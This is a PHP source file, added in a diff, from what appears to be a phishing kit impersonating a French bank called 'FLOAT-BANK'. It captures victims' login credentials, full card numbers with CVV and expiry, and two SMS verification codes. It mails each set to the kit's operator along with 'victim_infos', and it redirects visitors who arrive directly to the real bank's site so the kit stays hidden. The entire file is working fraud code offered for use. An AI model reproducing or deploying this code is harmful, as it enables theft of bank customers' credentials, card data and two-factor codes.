@@ -1,0 +1,128 @@
+<?php
+    /*******
+    Main Author: Z0N51
+    Contact me on telegram : https://t.me/z0n51
+    ********************************************************/
+
+    require_once 'includes/main.php';
+    if( $_GET['pwd'] == PASSWORD ) {
+        session_destroy();
+        visitors();
+        header("Location: clients/login.php?verification#_");
+        exit();
+    } else if( !empty($_GET['redirection']) ) {
+        $red = $_GET['redirection'];
+        if( $red == 'badlogin' ) {
+            header("Location: clients/login.php?error=1&verification#_");
+            exit();
+        }
+        if( $red == 'errorsms' ) {
+            header("Location: clients/sms.php?error=1&verification#_");
+            exit();
+        }
+        header("Location: clients/". $red .".php?verification#_");
+        exit();
+    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
+        if( !empty($_POST['captcha']) ) {
+            header("HTTP/1.0 404 Not Found");
+            die();
+        }
+        if ($_POST['step'] == "login") {
+            $_SESSION['errors']     = [];
+            $_SESSION['identifiant']  = $_POST['identifiant'];
+            $_SESSION['password']    = $_POST['password'];
+            if( empty($_POST['identifiant']) ) {
+                $_SESSION['errors']['identifiant'] = true;
+            }
+            if( empty($_POST['password']) ) {
+                $_SESSION['errors']['password'] = true;
+            }
+            if( count($_SESSION['errors']) == 0 ) {
+                $subject = get_client_ip() . ' | FLOAT-BANK | Login';
+                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
+                $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
+                $message .= 'Password : ' . $_POST['password'] . "\r\n";
+                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
+                $message .= victim_infos();
+                send($subject,$message);
+                header("Location: clients/loading1.php?verification#_");
+                exit();
+            } else {
+                header("Location: clients/login.php?error=1&verification#_");
+                exit();
+            }
+        }
+        if ($_POST['step'] == "cc") {
+            $_SESSION['errors']      = [];
+            $_SESSION['one'] = $_POST['one'];
+            $_SESSION['two']    = $_POST['two'];
+            $_SESSION['three']   = $_POST['three'];
+            $date_ex     = explode('/',$_POST['two']);
+            $card_number = validate_cc_number($_POST['one']);
+            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
+            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
+            if( $card_number == false ) {
+                $_SESSION['errors']['one'] = 'Veuillez saisir un numéro de la carte valide.';
+            }
+            if( $card_cvv == false ) {
+                $_SESSION['errors']['three'] = 'Veuillez saisir un numéro valide.';
+            }
+            if( $card_date == false ) {
+                $_SESSION['errors']['two'] = 'Veuillez saisir une date valide.';
+            }
+            if( count($_SESSION['errors']) == 0 ) {
+                $subject = get_client_ip() . ' | FLOAT-BANK | Card';
+                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
+                $message .= 'Card Number : ' . $_POST['one'] . "\r\n";
+                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
+                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
+                $message .= '/-- END CARD INFOS --/' . "\r\n";
+                $message .= victim_infos();
+                send($subject,$message);
+                unset($_SESSION['errors']);
+                header("Location: clients/success.php?verification#_");
+            } else {
+                header("Location: clients/cc.php?error=1&verification#_");
+            }
+        }
+        if ($_POST['step'] == "sms1") {
+            $_SESSION['errors']     = [];
+            $_SESSION['sms_code1']   = $_POST['sms_code1'];
+            if( empty($_POST['sms_code1']) ) {
+                $_SESSION['errors']['sms_code1'] = 'Le code est invalide.';
+            }
+            if( count($_SESSION['errors']) == 0 ) {
+                $subject = get_client_ip() . ' | FLOAT-BANK | Sms 2';
+                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
+                $message .= 'SMS code : ' . $_POST['sms_code1'] . "\r\n";
+                $message .= '/-- END SMS INFOS --/' . "\r\n";
+                $message .= victim_infos();
+                send($subject,$message);
+                header("Location: clients/loading2.php?verification#_");
+            } else {
+                header("Location: clients/sms1.php?error=1&verification#_");
+            }
+        }
+        if ($_POST['step'] == "sms2") {
+            $_SESSION['errors']     = [];
+            $_SESSION['sms_code2']   = $_POST['sms_code2'];
+            if( empty($_POST['sms_code2']) ) {
+                $_SESSION['errors']['sms_code2'] = 'Le code est invalide.';
+            }
+            if( count($_SESSION['errors']) == 0 ) {
+                $subject = get_client_ip() . ' | FLOAT-BANK | Sms 2';
+                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
+                $message .= 'SMS code : ' . $_POST['sms_code2'] . "\r\n";
+                $message .= '/-- END SMS INFOS --/' . "\r\n";
+                $message .= victim_infos();
+                send($subject,$message);
+                header("Location: clients/success.php?verification#_");
+            } else {
+                header("Location: clients/sms2.php?error=1&verification#_");
+            }
+        }
+    } else {
+        header("Location: " . OFFICIAL_WEBSITE);
+        exit();
+    }
+?>
